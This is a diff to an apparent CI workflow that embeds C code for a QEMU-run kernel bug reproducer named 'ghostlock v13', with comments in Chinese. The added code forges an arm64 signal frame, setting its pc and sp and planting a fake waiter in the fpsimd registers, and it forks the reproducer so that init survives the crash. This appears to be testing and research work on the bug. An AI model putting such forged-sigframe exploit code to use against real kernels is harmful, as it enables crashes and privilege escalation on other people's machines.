@@ -253,9 +253,18 @@ jobs:
             return NULL;
           }
 
+          /* sigreturn 恢复后 waiter 线程跳到这里死循环，避免跳非法地址崩溃 */
+          static void __attribute__((noinline)) safe_after_sig(void) {
+            for (;;) sleep(60);
+          }
+
           /* 构造 rt_sigframe：在偏移 0x250 放 fpsimd_context，vregs(512B @0x260) = 伪造 waiter */
           static void build_sigframe(unsigned char *sf, int ws) {
             memset(sf, 0, 0x1000);
+            /* sigcontext.pc/sp/pstate（offsetof 实测：sp@0x230 pc@0x238）
+               → sigreturn 恢复后跳到 safe_after_sig 死循环，不崩溃 */
+            *(uint64_t *)(sf + 0x230) = (uint64_t)sf + 0x8000;  /* sp */
+            *(uint64_t *)(sf + 0x238) = (uint64_t)&safe_after_sig; /* pc */
             /* fpsimd_context.head：magic + size */
             uint32_t *head = (uint32_t *)(sf + SF_FPSIMD_OFF);
             head[0] = FPSIMD_MAGIC;
@@ -444,6 +453,7 @@ jobs:
           #include <sys/mount.h>
           #include <sys/reboot.h>
           #include <sys/stat.h>
+          #include <sys/wait.h>
           #include <unistd.h>
           #include <stdio.h>
           int main(void) {
@@ -453,9 +463,18 @@ jobs:
             syscall(SYS_mount, "sysfs", "/sys", "sysfs", 0, 0);
             printf("=== QEMU ghostlock v13 start ===\n");
             fflush(stdout);
-            execl("/repro", "repro", NULL);
-            printf("exec failed\n");
-            syscall(SYS_reboot, 0xfee1dead, 672274793, 0x4321fedc, NULL);
+            /* fork 子进程跑 repro：sigreturn 会恢复非法寄存器导致 repo 崩溃，
+               但不能让 pid 1(init) 崩溃（否则内核 kill init panic） */
+            pid_t p = fork();
+            if (p == 0) {
+              execl("/repro", "repro", NULL);
+              _exit(1);
+            }
+            int st;
+            waitpid(p, &st, 0);
+            printf("=== repro exited status=%d, init stays alive ===\n", st);
+            /* 保持 init 存活，避免 reboot 前 panic */
+            for (;;) sleep(10);
             return 0;
           }
           EOF2
